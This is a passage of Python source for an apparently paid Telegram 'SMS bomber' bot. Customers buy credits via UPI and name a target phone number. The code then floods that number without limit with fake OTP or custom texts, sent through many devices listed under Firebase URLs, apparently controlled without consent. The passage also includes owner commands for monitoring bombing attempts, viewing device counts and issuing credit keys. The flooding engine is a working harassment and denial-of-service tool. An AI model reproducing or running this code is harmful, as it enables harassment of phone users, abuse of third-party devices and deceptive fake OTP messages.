        txt = f"💰 <b>{cr} Cʀᴇᴅɪᴛs</b>\n💵 ₹{amt}\n\n📱 UPI: <code>{UPI_ID}</code>\n📛 {UPI_NAME}\n\n📸 Sᴇɴᴅ Tʀᴀɴsᴀᴄᴛɪᴏɴ ID Oʀ SS.\n⏳ Aᴅᴍɪɴ ᴀᴘᴘʀᴏᴠᴀʟ ᴋᴇ ʙᴀᴀᴅ ᴄʀᴇᴅɪᴛs ᴍɪʟᴇɴɢᴇ!"
        try: await q.edit_message_text(txt, parse_mode="HTML")
        except: pass
        return

    if data.startswith("msgtype_"):
        if data == "msgtype_cancel":
            context.user_data.pop('bulk_step', None)
            try: await q.edit_message_text("❌ Cᴀɴᴄᴇʟʟᴇᴅ.")
            except: pass
            return
        t = data.split("_")[1]
        if t == "random":
            context.user_data['custom_message'] = "Your OTP is: {otp} | Don't share."
            context.user_data['is_custom_message'] = False
            try: await q.edit_message_text("✅ Usɪɴɢ OTP...")
            except: pass
            if not deduct_credit(uid):
                try: await q.message.reply_text("❌ Iɴsᴜғғɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs.")
                except: pass
                return
            log_user_action(uid, "Bulk SMS", f"Target: {context.user_data.get('bulk_number')}")
            context.user_data.pop('bulk_step', None)
            start_bomb_thread(uid, context.user_data.get('bulk_number'), "Your OTP is: {otp} | Don't share.")
            try: await q.message.reply_text("🚀 Bᴏᴍʙ Sᴛᴀʀᴛᴇᴅ — UNLIMITED!\n🛑 /cancel ᴛᴏ sᴛᴏᴘ")
            except: pass
        else:
            try: await q.edit_message_text(
                "✏️ Eɴᴛᴇʀ Cᴜsᴛᴏᴍ Mᴇssᴀɢᴇ:\n🔢 <code>{otp}</code> Fᴏʀ OTP.\n❌ /cancel", parse_mode="HTML")
            except: pass
            context.user_data['bulk_step'] = 'custom_msg'
        return

    if data == "stop_bulk":
        context.user_data['stop_sending'] = True
        try: await q.edit_message_text("🛑 Sᴛᴏᴘᴘɪɴɢ...")
        except: pass

# ---------- BOMB ----------
_active_bombs = {}

def start_bomb_thread(uid, number, msg_text):
    stop_flag = {"stop": False}
    _active_bombs[uid] = stop_flag
    t = threading.Thread(target=_run_bomb_in_thread, args=(uid, number, msg_text, stop_flag), daemon=True)
    t.start()

def _run_bomb_in_thread(uid, number, msg_text, stop_flag):
    try:
        asyncio.run(_bomb_async(uid, number, msg_text, stop_flag))
    except Exception as e:
        print(f"❌ Bomb thread error: {e}")

async def _bomb_async(uid, number, msg_text, stop_flag):
    bot = Bot(token=TOKEN)
    total_sent = 0
    total_failed = 0
    cycle = 1
    otp_ph = re.search(r'\{otp(:\d+)?\}', msg_text)
    otp_len = 6
    if otp_ph and otp_ph.group(1):
        try:
            otp_len = int(otp_ph.group(1)[1:])
            otp_len = max(1, min(10, otp_len))
        except: otp_len = 6

    progress_id = None
    try:
        pm = await bot.send_message(chat_id=uid, text=f"🚀 Bᴏᴍʙ Sᴛᴀʀᴛᴇᴅ!\n📱 {number}\n⏳...")
        progress_id = pm.message_id
    except: pass

    log_bomb_attempt(uid, number)

    if not _cache_ready.is_set():
        _cache_ready.wait(timeout=10)

    all_devices = _device_cache["data"].get("all_devices", [])
    if not all_devices:
        if progress_id:
            try:
                await bot.edit_message_text(chat_id=uid, message_id=progress_id, text="❌ No devices!")
            except: pass
        return

    last_update_time = [0.0]
    last_sent_count = [0]
    update_lock = asyncio.Lock()

    async def update_progress(force=False):
        if not progress_id: return
        now = time.time()
        if not force and (now - last_update_time[0]) < 5:
            return
        if not force and total_sent == last_sent_count[0]:
            return
        async with update_lock:
            last_update_time[0] = now
            last_sent_count[0] = total_sent
            try:
                await bot.edit_message_text(
                    chat_id=uid,
                    message_id=progress_id,
                    text=(
                        f"💥 Bᴏᴍʙɪɴɢ Lɪᴠᴇ...\n"
                        f"━━━━━━━━━━━━━━\n"
                        f"✅ Sᴇɴᴛ: {total_sent} 📤\n"
                        f"❌ Fᴀɪʟᴇᴅ: {total_failed} 💔\n"
                        f"🔄 Cʏᴄʟᴇ: {cycle}\n"
                        f"📱 Dᴇᴠɪᴄᴇs: {len(all_devices)}\n"
                        f"━━━━━━━━━━━━━━\n"
                        f"🛑 /cancel ᴛᴏ sᴛᴏᴘ"
                    )
                )
            except RetryAfter as e:
                await asyncio.sleep(e.retry_after + 5)
            except Exception:
                pass

    loop = asyncio.get_event_loop()
    sem = asyncio.Semaphore(MAX_CONCURRENT)

    async def one_send(url, dev_id):
        nonlocal total_sent, total_failed
        async with sem:
            if stop_flag.get("stop") or is_user_banned(uid):
                return
            final_msg = msg_text
            if otp_ph:
                otp = generate_otp(otp_len)
                final_msg = re.sub(r'\{otp(:\d+)?\}', otp, msg_text)
            try:
                ok = await asyncio.wait_for(
                    loop.run_in_executor(None, _send_sms_blocking, url, dev_id, number, final_msg),
                    timeout=5
                )
            except:
                ok = False
            if ok: total_sent += 1
            else: total_failed += 1

    while not stop_flag.get("stop"):
        if is_user_banned(uid): break
        current_devices = _device_cache["data"].get("all_devices", [])
        if not current_devices:
            await asyncio.sleep(0.1); continue

        all_tasks = []
        for url in FIREBASE_URLS:
            if stop_flag.get("stop") or is_user_banned(uid): break
            url_devices = _device_cache["data"].get("url_devices", {}).get(url, [])
            if not url_devices: continue
            for dev_id in url_devices[:MAX_DEVICES_PER_URL]:
                if stop_flag.get("stop") or is_user_banned(uid): break
                all_tasks.append(asyncio.create_task(one_send(url, dev_id)))

        if all_tasks:
            for i in range(0, len(all_tasks), BATCH_SIZE):
                if stop_flag.get("stop"): break
                batch = all_tasks[i:i+BATCH_SIZE]
                done, pending = await asyncio.wait(batch, timeout=BULK_TIMEOUT)
                for task in pending: task.cancel()
                await asyncio.sleep(0)
                await update_progress(force=True)

        cycle += 1
        await update_progress(force=True)
        await asyncio.sleep(0)

    reason = "🛑 Sᴛᴏᴘᴘᴇᴅ" if stop_flag.get("stop") else "✅ Cᴏᴍᴘʟᴇᴛᴇᴅ"
    if progress_id:
        try:
            await bot.edit_message_text(
                chat_id=uid, message_id=progress_id,
                text=(
                    f"{reason}\n━━━\n"
                    f"✅ Sᴇɴᴛ: {total_sent} 📤\n"
                    f"❌ Fᴀɪʟᴇᴅ: {total_failed} 💔\n"
                    f"🔄 Tᴏᴛᴀʟ Cʏᴄʟᴇs: {cycle}\n"
                    f"🚀 Dᴏɴᴇ!"
                ))
        except: pass
    log_user_action(uid, "Bulk SMS", f"Sent {total_sent}, Failed {total_failed}")
    _active_bombs.pop(uid, None)

# ---------- COMMANDS ----------
async def redeem_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not update.effective_message: return
    uid = update.effective_user.id
    if is_user_banned(uid): return await update.effective_message.reply_text("❌ Bᴀɴɴᴇᴅ")
    if await check_maintenance(update, context): return
    if not await check_force_join(update, context): return
    if not context.args: return await update.effective_message.reply_text("📝 /redeem KEY")
    key = context.args[0].strip().upper()
    success, msg = redeem_key(uid, key)
    if success:
        await update.effective_message.reply_text(f"{msg}\n💰 Nᴇᴡ: <code>{get_user_credits(uid)}</code>", parse_mode="HTML")
    else:
        await update.effective_message.reply_text(f"{msg}")

async def genkey_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not update.effective_message: return
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    if len(context.args) < 1: return await update.effective_message.reply_text("📝 /genkey credits [days] [uses]")
    try:
        credits = int(context.args[0])
        days = int(context.args[1]) if len(context.args) > 1 else 30
        max_uses = int(context.args[2]) if len(context.args) > 2 else 1
    except: return await update.effective_message.reply_text("❌ Invalid")
    key = generate_redeem_key(credits, days, max_uses, uid)
    await update.effective_message.reply_text(
        f"✅ <b>Kᴇʏ</b>\n🔑 <code>{key}</code>\n💰 {credits}\n📅 {days}d\n👥 {max_uses}\n━━━\n<code>/redeem {key}</code>",
        parse_mode="HTML")

async def keys_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not update.effective_message: return
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    keys = get_all_keys()
    if not keys: return await update.effective_message.reply_text("📭 No keys")
    msg = "🔑 <b>Kᴇʏs:</b>\n━━━\n"
    for k in keys:
        key, credits, max_uses, used_count, expiry_at = k
        ed = datetime.fromtimestamp(expiry_at).strftime("%d-%m-%Y")
        s = "✅" if used_count < max_uses else "❌"
        msg += f"{s} <code>{key}</code> 💰{credits} {used_count}/{max_uses} {ed}\n"
    await update.effective_message.reply_text(msg, parse_mode="HTML")

async def maint_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not update.effective_message: return
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    if not context.args:
        s = "🟢 ON" if is_maintenance_on() else "🔴 OFF"
        return await update.effective_message.reply_text(f"🔧 {s}\n/maint on|off")
    arg = context.args[0].lower()
    if arg in ("on","1","true","yes"):
        set_maintenance(True); await update.effective_message.reply_text("✅ ON")
    elif arg in ("off","0","false","no"):
        set_maintenance(False); await update.effective_message.reply_text("✅ OFF")
    else: await update.effective_message.reply_text("❌ /maint on|off")

async def myid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not update.effective_message: return
    uid = update.effective_user.id
    if await check_maintenance(update, context): return
    if not await check_force_join(update, context): return
    role = "👑 Oᴡɴᴇʀ" if is_owner(uid) else "👤 Usᴇʀ"
    await update.effective_message.reply_text(f"🆔 <code>{uid}</code>\n📋 {role}", parse_mode="HTML")

async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not update.effective_message: return
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    all_users = get_all_users(); total = len(all_users); banned = get_banned_count()
    if total == 0: return await update.effective_message.reply_text("📭")
    msg = f"📊 <b>Usᴇʀs:</b> {total} | 🚫 {banned}\n━━━\n"
    for i, (uid2, cr, _) in enumerate(all_users[:50], 1):
        msg += f"{i}. <code>{uid2}</code> 💰{cr}\n"
    await update.effective_message.reply_text(msg, parse_mode="HTML")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not update.effective_message: return
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    if not context.args: return await update.effective_message.reply_text("📢 /broadcast msg")
    msg = " ".join(context.args)
    users = get_all_users(); total = len(users)
    status = await update.effective_message.reply_text(f"📢 Tᴏ {total}...")
    sent = failed = 0
    for uid2, _, _ in users:
        if is_user_banned(uid2): failed += 1; continue
        try:
            await context.application.bot.send_message(uid2, f"📢 <b>Bʀᴏᴀᴅᴄᴀsᴛ</b>\n\n{msg}", parse_mode="HTML")
            sent += 1
        except: failed += 1
        await asyncio.sleep(0.05)
    await status.edit_text(f"✅ {sent} | ❌ {failed}", parse_mode="HTML")

async def add_credits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not update.effective_message: return
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    if len(context.args) < 2: return await update.effective_message.reply_text("📝 /addcredits ID AMT")
    try:
        target = int(context.args[0]); amount = int(context.args[1])
        add_credits(target, amount)
        await update.effective_message.reply_text(f"✅ +{amount} to {target}")
    except: await update.effective_message.reply_text("❌ Invalid")

async def remove_credits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not update.effective_message: return
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    if len(context.args) < 2: return await update.effective_message.reply_text("📝 /removecredits ID AMT")
    try:
        target = int(context.args[0]); amount = int(context.args[1])
        if remove_credits(target, amount):
            await update.effective_message.reply_text(f"✅ -{amount} from {target}")
        else: await update.effective_message.reply_text("❌ Insufficient")
    except: await update.effective_message.reply_text("❌ Invalid")

async def ban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not update.effective_message: return
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    if not context.args: return await update.effective_message.reply_text("📝 /ban ID")
    try:
        target = int(context.args[0])
        if ban_user(target, uid): await update.effective_message.reply_text(f"✅ Banned {target}")
        else: await update.effective_message.reply_text("❌ Failed")
    except: await update.effective_message.reply_text("❌ Invalid")

async def unban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not update.effective_message: return
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    if not context.args: return await update.effective_message.reply_text("📝 /unban ID")
    try:
        target = int(context.args[0])
        if unban_user(target): await update.effective_message.reply_text(f"✅ Unbanned {target}")
        else: await update.effective_message.reply_text("❌ Not banned")
    except: await update.effective_message.reply_text("❌ Invalid")

async def monitor_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not update.effective_message: return
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    bombs = get_recent_bombs(15)
    if not bombs: return await update.effective_message.reply_text("📭")
    msg = "🚨 <b>BOMB MONITOR</b>\n━━━\n"
    for uid_att, phone, count, last in bombs:
        try:
            user = await context.application.bot.get_chat(uid_att)
            uname = f"@{user.username}" if user.username else f"ID:{uid_att}"
        except: uname = f"ID:{uid_att}"
        msg += f"👤 {uname}\n📱 {phone} ({count}x)\n━━━\n"
    await update.effective_message.reply_text(msg, parse_mode="HTML")

async def device_status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not update.effective_message: return
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    refresh_device_cache_sync()
    data = _device_cache["data"]
    url_devices = data.get("url_devices", {})
    total = data.get("total", 0)
    working = data.get("urls", 0)
    header = (
        f"📊 <b>DEVICE STATUS</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"✅ Working: {working}\n"
        f"🔄 Total Devices: {total}\n"
        f"━━━━━━━━━━━━━━\n"
    )
    await update.effective_message.reply_text(header, parse_mode="HTML")
    working_list = [(url, devices) for url, devices in url_devices.items() if len(devices) > 0]
    working_list.sort(key=lambda x: len(x[1]), reverse=True)
    if not working_list:
        return await update.effective_message.reply_text("❌ No working URLs found.")
    current_chunk = ""; chunk_num = 1
    for url, devices in working_list:
        count = len(devices)
        short_url = url.replace("https://", "").replace(".firebaseio.com", "")[:30]
        line = f"✅ {short_url}: {count}\n"
        if len(current_chunk) + len(line) > 3500:
            await update.effective_message.reply_text(
                f"<b>Part {chunk_num}</b>\n<code>{current_chunk}</code>", parse_mode="HTML")
            chunk_num += 1; current_chunk = line
        else: current_chunk += line
    if current_chunk:
        await update.effective_message.reply_text(
            f"<b>Part {chunk_num}</b>\n<code>{current_chunk}</code>", parse_mode="HTML")
    await update.effective_message.reply_text(f"📊 <b>Total Working URLs: {len(working_list)}</b>", parse_mode="HTML")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not update.effective_message: return
    uid = update.effective_user.id
    if uid in _active_bombs:
        _active_bombs[uid]["stop"] = True
        await update.effective_message.reply_text("🛑 Bᴏᴍʙ sᴛᴏᴘᴘɪɴɢ...", reply_markup=get_main_keyboard(uid))
    else:
        await update.effective_message.reply_text("❌ Nᴏ ᴀᴄᴛɪᴠᴇ ʙᴏᴍʙ.", reply_markup=get_main_keyboard(uid))
    for k in ('bulk_step','bulk_number','custom_message','recharge_step','recharge_credits','recharge_amount','stop_sending','is_custom_message','admin_step'):
        context.user_data.pop(k, None)

async def shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not update.effective_message: return
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    await update.effective_message.reply_text("🛑 Shutting down...")
    await context.application.stop()
    os._exit(0)

# ---------- MAIN ----------
def main():
    print("🚀 Starting bot...")
    print("🔥 Cache background mein load ho raha hai...")
    threading.Thread(target=refresh_device_cache_sync, daemon=True).start()

    request = HTTPXRequest(connect_timeout=5.0, read_timeout=5.0, write_timeout=5.0, pool_timeout=5.0)
    app = Application.builder().token(TOKEN).request(request).build()

    async def error_handler(update, context):
        if isinstance(context.error, Conflict):
            print("⚠️ Bot already running!")
            sys.exit(1)
        elif isinstance(context.error, RetryAfter):
            print(f"⏳ Flood wait: {context.error.retry_after}s")
        else:
            print(f"❌ Error: {context.error}")

    app.add_error_handler(error_handler)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CommandHandler("myid", myid_cmd))
    app.add_handler(CommandHandler("users", users_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("addcredits", add_credits_cmd))
    app.add_handler(CommandHandler("removecredits", remove_credits_cmd))
    app.add_handler(CommandHandler("ban", ban_cmd))
    app.add_handler(CommandHandler("unban", unban_cmd))
    app.add_handler(CommandHandler("monitor", monitor_cmd))
    app.add_handler(CommandHandler("devices", device_status_cmd))
    app.add_handler(CommandHandler("shutdown", shutdown))
    app.add_handler(CommandHandler("genkey", genkey_cmd))
    app.add_handler(CommandHandler("redeem", redeem_cmd))
    app.add_handler(CommandHandler("keys", keys_cmd))
    app.add_handler(CommandHandler("maint", maint_cmd))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.PHOTO & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("""
╔═══════════════════════════╗
║  ⚡ SUPER FAST UNLIMITED SMS BLAST ⚡       ║
║  ✅ Live progress 5s                        ║
║  ✅ Payment Approve/Reject system           ║
║  ✅ Custom SMS → saare devices              ║
║  ✅ Flood control safe                      ║
╚═══════════════════════════╝
    """)

    try:
        app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
    except Conflict:
        print("\n⚠️ Conflict!")
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Stopped.")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Error: {e}")
        sys.exit(1)